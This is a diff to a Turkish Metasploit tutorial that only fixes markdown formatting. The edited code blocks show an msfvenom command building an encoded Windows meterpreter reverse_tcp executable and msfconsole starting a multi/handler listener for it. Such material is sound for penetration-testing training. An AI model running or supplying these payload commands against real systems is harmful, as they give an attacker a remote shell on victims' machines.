@@ -49,10 +49,10 @@ Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script 
 
 
 ```bash
-root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST**=**192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
+root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 (iteration**=**0)
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: Meterpreter.exe
@@ -94,9 +94,9 @@ Yeni yazdığımız scriptleri `/usr/share/metasploit-framework/scripts/meterpre
 ```bash
 root@kali:~# msfconsole -r meterpreter.rc
 
-       **=[** metasploit v4.8.2-2014021901 **[**core:4.8 api:1.0] **]**
-+ -- --**=[** 1265 exploits - 695 auxiliary - 202 post **]**
-+ -- --**=[** 330 payloads - 32 encoders - 8 nops      **]**
+       [ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
++ -- --[ 1265 exploits - 695 auxiliary - 202 post ]
++ -- --[ 330 payloads - 32 encoders - 8 nops      ]
 
 resource> use exploit/multi/handler
 resource> set PAYLOAD windows/meterpreter/reverse_tcp
